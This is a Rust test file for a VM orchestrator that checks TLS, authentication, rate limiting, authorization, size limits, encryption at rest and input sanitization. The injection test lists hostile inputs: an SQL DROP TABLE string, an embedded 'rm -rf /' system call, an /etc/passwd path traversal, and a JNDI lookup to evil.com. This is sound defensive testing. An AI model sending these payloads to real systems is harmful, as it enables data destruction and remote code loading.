//! Security testing scenarios for the MultiVM system

use std::net::SocketAddr;
use std::path::PathBuf;
use std::sync::Arc;
use std::time::Duration;
use tokio::time::{sleep, timeout};
use tempfile::TempDir;
use multivm_core::{NodeId, VmId, ResourceRequirements};
use multivm_network::{TcpTransport, TcpTransportConfig, SecurityConfig, AuthToken};
use orchestrator::{OrchestratorConfig, Orchestrator};
use rpc::client::OrchestratorClient;

/// Generate test certificates for TLS testing
async fn generate_test_certs(dir: &std::path::Path) -> (PathBuf, PathBuf, PathBuf) {
    use rcgen::{generate_simple_self_signed_cert, CertifiedKey};
    
    let subject_alt_names = vec!["localhost".to_string(), "127.0.0.1".to_string()];
    let CertifiedKey { cert, key_pair } = generate_simple_self_signed_cert(subject_alt_names).unwrap();
    
    let cert_path = dir.join("server.crt");
    let key_path = dir.join("server.key");
    let ca_path = dir.join("ca.crt");
    
    std::fs::write(&cert_path, cert.pem()).unwrap();
    std::fs::write(&key_path, key_pair.serialize_pem()).unwrap();
    std::fs::write(&ca_path, cert.pem()).unwrap(); // Self-signed, so cert is CA
    
    (cert_path, key_path, ca_path)
}

#[tokio::test]
async fn test_tls_enforcement() {
    let temp_dir = TempDir::new().unwrap();
    let (cert_path, key_path, _ca_path) = generate_test_certs(temp_dir.path()).await;
    
    // Create server with TLS enabled
    let config = TcpTransportConfig {
        bind_addr: "127.0.0.1:8600".parse().unwrap(),
        enable_tls: true,
        tls_cert_path: Some(cert_path.clone()),
        tls_key_path: Some(key_path.clone()),
        ..Default::default()
    };
    
    let server = TcpTransport::new(config).await.unwrap();
    
    // Try to connect without TLS (should fail)
    let insecure_config = TcpTransportConfig {
        bind_addr: "127.0.0.1:0".parse().unwrap(),
        enable_tls: false,
        ..Default::default()
    };
    
    let client = TcpTransport::new(insecure_config).await.unwrap();
    let result = timeout(
        Duration::from_secs(2),
        client.connect("127.0.0.1:8600".parse().unwrap())
    ).await;
    
    assert!(result.is_err() || result.unwrap().is_err(), 
            "Insecure connection to TLS server should fail");
}

#[tokio::test]
async fn test_authentication_required() {
    let temp_dir = TempDir::new().unwrap();
    let node_id = NodeId::new();
    
    let config = OrchestratorConfig {
        node_id: Some(node_id),
        data_dir: temp_dir.path().to_path_buf(),
        rpc_addr: "127.0.0.1:8601".parse().unwrap(),
        enable_tls: false, // Simplify test
        security: SecurityConfig {
            auth_required: true,
            auth_tokens: vec![
                AuthToken::new("admin", "admin-secret", vec!["admin"]),
                AuthToken::new("user", "user-secret", vec!["read", "write"]),
            ],
            rate_limit_per_second: 100,
            max_request_size: 1024 * 1024,
        },
        ..Default::default()
    };
    
    let orchestrator = Orchestrator::new(config).await.unwrap();
    
    // Start orchestrator in background
    tokio::spawn(async move {
        orchestrator.run().await.unwrap();
    });
    
    sleep(Duration::from_millis(500)).await;
    
    // Try to connect without auth token (should fail)
    let client = OrchestratorClient::new("http://127.0.0.1:8601", None).await;
    assert!(client.is_err(), "Connection without auth should fail");
    
    // Try with invalid token
    let client = OrchestratorClient::new("http://127.0.0.1:8601", Some("invalid-token")).await;
    assert!(client.is_err(), "Connection with invalid token should fail");
    
    // Try with valid token
    let client = OrchestratorClient::new("http://127.0.0.1:8601", Some("admin-secret")).await;
    assert!(client.is_ok(), "Connection with valid token should succeed");
}

#[tokio::test]
async fn test_rate_limiting() {
    let temp_dir = TempDir::new().unwrap();
    let node_id = NodeId::new();
    
    let config = OrchestratorConfig {
        node_id: Some(node_id),
        data_dir: temp_dir.path().to_path_buf(),
        rpc_addr: "127.0.0.1:8602".parse().unwrap(),
        enable_tls: false,
        security: SecurityConfig {
            auth_required: false,
            rate_limit_per_second: 10, // Low limit for testing
            max_request_size: 1024 * 1024,
            ..Default::default()
        },
        ..Default::default()
    };
    
    let orchestrator = Arc::new(Orchestrator::new(config).await.unwrap());
    
    // Start orchestrator
    let orchestrator_clone = orchestrator.clone();
    tokio::spawn(async move {
        orchestrator_clone.run().await.unwrap();
    });
    
    sleep(Duration::from_millis(500)).await;
    
    let client = OrchestratorClient::new("http://127.0.0.1:8602", None).await.unwrap();
    
    // Send requests rapidly
    let mut success_count = 0;
    let mut rate_limited_count = 0;
    
    for _ in 0..20 {
        match client.list_vms().await {
            Ok(_) => success_count += 1,
            Err(e) => {
                if e.to_string().contains("rate limit") || e.to_string().contains("429") {
                    rate_limited_count += 1;
                }
            }
        }
    }
    
    // Should have some rate limited requests
    assert!(rate_limited_count > 0, "Some requests should be rate limited");
    assert!(success_count > 0, "Some requests should succeed");
}

#[tokio::test]
async fn test_authorization_levels() {
    let temp_dir = TempDir::new().unwrap();
    let node_id = NodeId::new();
    
    let config = OrchestratorConfig {
        node_id: Some(node_id),
        data_dir: temp_dir.path().to_path_buf(),
        rpc_addr: "127.0.0.1:8603".parse().unwrap(),
        enable_tls: false,
        security: SecurityConfig {
            auth_required: true,
            auth_tokens: vec![
                AuthToken::new("admin", "admin-token", vec!["admin"]),
                AuthToken::new("reader", "reader-token", vec!["read"]),
                AuthToken::new("writer", "writer-token", vec!["write"]),
            ],
            ..Default::default()
        },
        ..Default::default()
    };
    
    let orchestrator = Arc::new(Orchestrator::new(config).await.unwrap());
    
    // Start orchestrator
    let orchestrator_clone = orchestrator.clone();
    tokio::spawn(async move {
        orchestrator_clone.run().await.unwrap();
    });
    
    sleep(Duration::from_millis(500)).await;
    
    // Test admin access (should have all permissions)
    let admin_client = OrchestratorClient::new("http://127.0.0.1:8603", Some("admin-token"))
        .await.unwrap();
    
    let vm_id = VmId::new();
    let resources = ResourceRequirements::new(1.0, 512, 10, None).unwrap();
    
    // Admin should be able to create VM
    let result = admin_client.create_vm(vm_id, "admin-vm".to_string(), resources.clone()).await;
    assert!(result.is_ok(), "Admin should be able to create VM");
    
    // Test reader access (read-only)
    let reader_client = OrchestratorClient::new("http://127.0.0.1:8603", Some("reader-token"))
        .await.unwrap();
    
    // Reader should be able to list VMs
    let result = reader_client.list_vms().await;
    assert!(result.is_ok(), "Reader should be able to list VMs");
    
    // Reader should NOT be able to create VM
    let vm_id2 = VmId::new();
    let result = reader_client.create_vm(vm_id2, "reader-vm".to_string(), resources.clone()).await;
    assert!(result.is_err(), "Reader should not be able to create VM");
    
    // Test writer access (write but not admin)
    let writer_client = OrchestratorClient::new("http://127.0.0.1:8603", Some("writer-token"))
        .await.unwrap();
    
    // Writer should be able to create VM
    let vm_id3 = VmId::new();
    let result = writer_client.create_vm(vm_id3, "writer-vm".to_string(), resources).await;
    assert!(result.is_ok(), "Writer should be able to create VM");
}

#[tokio::test]
async fn test_request_size_limit() {
    let temp_dir = TempDir::new().unwrap();
    let node_id = NodeId::new();
    
    let config = OrchestratorConfig {
        node_id: Some(node_id),
        data_dir: temp_dir.path().to_path_buf(),
        rpc_addr: "127.0.0.1:8604".parse().unwrap(),
        enable_tls: false,
        security: SecurityConfig {
            auth_required: false,
            max_request_size: 1024, // 1KB limit for testing
            ..Default::default()
        },
        ..Default::default()
    };
    
    let orchestrator = Arc::new(Orchestrator::new(config).await.unwrap());
    
    // Start orchestrator
    let orchestrator_clone = orchestrator.clone();
    tokio::spawn(async move {
        orchestrator_clone.run().await.unwrap();
    });
    
    sleep(Duration::from_millis(500)).await;
    
    let client = OrchestratorClient::new("http://127.0.0.1:8604", None).await.unwrap();
    
    // Try to create VM with large metadata (exceeds size limit)
    let vm_id = VmId::new();
    let mut large_name = String::new();
    for _ in 0..2000 {
        large_name.push_str("very-long-name-");
    }
    
    let resources = ResourceRequirements::new(1.0, 512, 10, None).unwrap();
    let result = client.create_vm(vm_id, large_name, resources).await;
    
    assert!(result.is_err(), "Large request should be rejected");
}

#[tokio::test]
async fn test_encrypted_storage() {
    use multivm_storage::{Storage, RocksDBStorage, StorageConfig};
    
    let temp_dir = TempDir::new().unwrap();
    let config = StorageConfig {
        path: temp_dir.path().to_path_buf(),
        encryption_key: Some("test-encryption-key-32-bytes-long!!!".to_string()),
        compression_enabled: true,
        cache_size_mb: 64,
        wal_enabled: true,
        wal_dir: None,
        sync_on_commit: true,
    };
    
    let storage = RocksDBStorage::new(config).await.unwrap();
    
    // Store sensitive data
    let sensitive_data = b"sensitive-vm-configuration-data";
    storage.put(b"vm-config", sensitive_data).await.unwrap();
    
    // Data should be encrypted at rest
    let raw_db_path = temp_dir.path().join("data.db");
    if raw_db_path.exists() {
        let raw_content = std::fs::read(&raw_db_path).unwrap();
        // Should not find plain text in raw DB file
        assert!(!raw_content.windows(sensitive_data.len())
                .any(|window| window == sensitive_data),
                "Sensitive data should be encrypted at rest");
    }
    
    // But should decrypt correctly when read through API
    let retrieved = storage.get(b"vm-config").await.unwrap().unwrap();
    assert_eq!(retrieved, sensitive_data, "Should decrypt correctly");
}

#[tokio::test]
async fn test_injection_attack_prevention() {
    let temp_dir = TempDir::new().unwrap();
    let node_id = NodeId::new();
    
    let config = OrchestratorConfig {
        node_id: Some(node_id),
        data_dir: temp_dir.path().to_path_buf(),
        rpc_addr: "127.0.0.1:8605".parse().unwrap(),
        enable_tls: false,
        ..Default::default()
    };
    
    let orchestrator = Arc::new(Orchestrator::new(config).await.unwrap());
    
    // Start orchestrator
    let orchestrator_clone = orchestrator.clone();
    tokio::spawn(async move {
        orchestrator_clone.run().await.unwrap();
    });
    
    sleep(Duration::from_millis(500)).await;
    
    let client = OrchestratorClient::new("http://127.0.0.1:8605", None).await.unwrap();
    
    // Test various injection attempts
    let injection_attempts = vec![
        "vm-name'; DROP TABLE vms; --",
        "vm-name\"; system('rm -rf /'); //",
        "../../../etc/passwd",
        "vm-name\0null-byte",
        "vm-${jndi:ldap://evil.com/a}",
    ];
    
    for (i, attempt) in injection_attempts.iter().enumerate() {
        let vm_id = VmId::new();
        let resources = ResourceRequirements::new(1.0, 256, 5, None).unwrap();
        
        // Should either sanitize or reject malicious input
        let result = client.create_vm(vm_id, attempt.to_string(), resources).await;
        
        if result.is_ok() {
            // If accepted, verify it was sanitized
            let vms = client.list_vms().await.unwrap();
            let created_vm = vms.iter().find(|v| v.id == vm_id);
            assert!(created_vm.is_some());
            
            // Name should be sanitized (no special chars)
            let name = &created_vm.unwrap().name;
            assert!(!name.contains(';') && !name.contains('\'') && !name.contains('"'),
                    "Injection attempt {} should be sanitized", i);
        }
    }
}

#[tokio::test]
async fn test_secure_communication_channels() {
    let temp_dir = TempDir::new().unwrap();
    let (cert_path, key_path, ca_path) = generate_test_certs(temp_dir.path()).await;
    
    // Create two nodes with TLS
    let node1_config = OrchestratorConfig {
        node_id: Some(NodeId::new()),
        data_dir: temp_dir.path().join("node1"),
        consensus: consensus::Config {
            bind_addr: "127.0.0.1:8606".parse().unwrap(),
            enable_tls: true,
            tls_cert_path: Some(cert_path.clone()),
            tls_key_path: Some(key_path.clone()),
            tls_ca_path: Some(ca_path.clone()),
            ..Default::default()
        },
        ..Default::default()
    };
    
    let node2_config = OrchestratorConfig {
        node_id: Some(NodeId::new()),
        data_dir: temp_dir.path().join("node2"),
        consensus: consensus::Config {
            bind_addr: "127.0.0.1:8607".parse().unwrap(),
            enable_tls: true,
            tls_cert_path: Some(cert_path),
            tls_key_path: Some(key_path),
            tls_ca_path: Some(ca_path),
            ..Default::default()
        },
        ..Default::default()
    };
    
    // Nodes should be able to establish secure communication
    let node1 = Orchestrator::new(node1_config).await.unwrap();
    let node2 = Orchestrator::new(node2_config).await.unwrap();
    
    // Verify TLS is enforced
    assert!(node1.consensus_config().enable_tls);
    assert!(node2.consensus_config().enable_tls);
}